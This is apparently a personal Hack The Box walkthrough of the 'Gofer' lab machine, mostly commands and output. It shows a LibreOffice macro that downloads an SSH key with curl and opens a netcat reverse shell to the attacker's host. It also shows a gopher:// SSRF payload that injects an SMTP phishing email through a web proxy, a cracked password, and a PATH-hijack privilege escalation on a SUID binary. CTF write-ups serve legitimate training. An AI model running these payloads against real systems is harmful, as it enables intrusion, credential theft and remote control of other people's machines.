# hard - Gofer

## User Flag

- Directory index: http://gofer.htb/assets/img/
Nothing unusual in the html source code. No special links, no weird comments.


What JS libs are being used:
- assets/vendor/aos/aos.js
- assets/vendor/bootstrap/js/bootstrap.bundle.min.js
- assets/vendor/glightbox/js/glightbox.min.js
- assets/vendor/isotope-layout/isotope.pkgd.min.js
- assets/vendor/php-email-form/validate.js
- assets/vendor/swiper/swiper-bundle.min.js

Ok, what about port scanning?
```bash
~z➤ sudo nmap -n -Pn -sV -O -T4 gofer.htb
...
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```


#### Samba service!
```bash
~z➤ smbclient -N  -L gofer.htb/shares/

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
SMB1 disabled -- no workgroup available

~z➤ smbclient -N //gofer.htb/shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 28 15:32:08 2022
  ..                                  D        0  Fri Apr 28 07:59:34 2023
  .backup                            DH        0  Thu Apr 27 08:49:32 2023

                5061888 blocks of size 1024. 2172964 blocks available
smb: \> cd .backup
smb: \.backup\> ls
  .                                   D        0  Thu Apr 27 08:49:32 2023
  ..                                  D        0  Fri Oct 28 15:32:08 2022
  mail                                N     1101  Thu Apr 27 08:49:32 2023

                5061888 blocks of size 1024. 2172964 blocks available
smb: \.backup\> get mail
getting file \.backup\mail of size 1101 as mail (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
```

Reading the file:
```bash
~z➤ cat mail
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

Nice story, so we have:
- An internal Email service
- The internal email service might be exploitable via .odt documents
- There is a WIP web proxy service
- Users:
    - jdavis@gofer.htb
    - tbuckley@gofer.htb

#### Exploiting gopher service
```bash
~z➤ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://gofer.htb/ -H "Host: FUZZ.gofer.htb" -fc 301
...
[Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 134ms]
    * FUZZ: proxy

:: Progress: [4989/4989] :: Job [1/1] :: 296 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

So that should be the proxy which is not yet protected, it is accepting POST requests:
```bash
~z➤ curl -X GET proxy.gofer.htb/index.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at proxy.gofer.htb Port 80</address>
</body></html>

~z➤ curl -X POST proxy.gofer.htb/index.php
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>%
```

That proxy is trying to pull data from the given url:
```bash
~z➤ curl -X POST "proxy.gofer.htb/index.php?url=http://10.10.14.7:6666/foo"
<!-- Welcome to Gofer proxy -->
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
1%
```

```bash
.../infosec/htb/p8➤ python -m http.server 6666
Serving HTTP on 0.0.0.0 port 6666 (http://0.0.0.0:6666/) ...
10.10.11.225 - - [31/Aug/2023 10:10:51] code 404, message File not found
10.10.11.225 - - [31/Aug/2023 10:10:51] "GET /foo HTTP/1.1" 404 -
```

Creating a macro with rev shell
{{< limg "/i/2023-08-31_10-23.png" "Libreoffice macro rev shell" >}}




LibreOffice Macro:
```bash
REM  *****  BASIC  *****
Sub Main
 Shell("mkdir -p /home/jhudson/.ssh")
 Shell("curl 10.10.14.7:6666/authorized_keys --output /home/jhudson/.ssh/authorized_keys")
 Shell("chmod 600 /home/jhudson/.ssh/authorized_keys")
 Shell("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.7 55555 >/tmp/f")
End Sub
```

The payload:
```txt
gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.7:6666/shell.odt>this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 
```

Triggering the exploit:
```bash
~z➤ curl -X POST "proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.7:6666/shell.odt>this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"
<!-- Welcome to Gofer proxy -->
220 gofer.htb ESMTP Postfix (Debian/GNU)
250 gofer.htb
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as 4D4EF806D
221 2.0.0 Bye
1%
```


SSHing into jhudson user:
```bash
.../infosec/htb/p8➤ ssh -i ./kkk jhudson@gofer.htb
...
jhudson@gofer:~$ id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
jhudson@gofer:~$ ls
Downloads  user.txt
```

## Root Flag

Searching for SUID bins:
```bash
jhudson@gofer:~$ find / -type f -perm -4000 2>/dev/null
...
/usr/bin/chfn
/usr/bin/newgrp
/usr/local/bin/notes
jhudson@gofer:~$ ls -ltra /usr/local/bin/notes
-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes

jhudson@gofer:~$ id
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
```

HTTP Creds!
```
jhudson@gofer:/etc/apache2/sites-enabled$ cat /etc/apache2/.htpasswd
tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
```

nono
```bash
.../infosec/htb/p8➤ echo 'dGJ1Y2tsZXk6b29QNGRpZXRpZTNvX2hxdWFldGk=' | base64 -d
tbuckley:ooP4dietie3o_hquaeti
```

sshing into tbuckley:
```bash
.../infosec/htb/p8➤ ssh tbuckley@gofer.htb
tbuckley@gofer.htb's password:
Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
tbuckley@gofer:~$ ls
tbuckley@gofer:~$ id
uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
```


Cracking httpasswd
```bash
.../infosec/htb/p8➤ john  --wordlist=/usr/share/dict/rockyou.txt pass
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
Use the "--format=md5crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:46 DONE (2023-08-31 11:44) 0g/s 132295p/s 132295c/s 132295C/s  edizzle69..*7¡Vamos!
Session completed
```

We can now run the notes app:
```bash
tbuckley@gofer:~$ /usr/local/bin/notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice:
```


tricking tar:
```bash
tbuckley@gofer:~$ export PATH=/home/tbuckley:$PATH
tbuckley@gofer:~$ ls
tar
tbuckley@gofer:~$ cat tar
#!/bin/bash
/bin/bash
```

notes app:
1. create user
2. delete user
3. create note: AAAAAAAAAAAAAAAAAAAAAAAAadmin

then rooted
```bash
root@gofer:~# id
uid=0(root) gid=0(root) groups=0(root),1002(tbuckley),1004(dev)
root@gofer:~#
```

## TODOs
- tcpdump sniffing
- crack httpasswd
- ip address encoding
- url encoding
- email template/headers
- gopher protocol/proxy
- reversing elf skills needed (Ghidra, radare2, frida, ida pro)
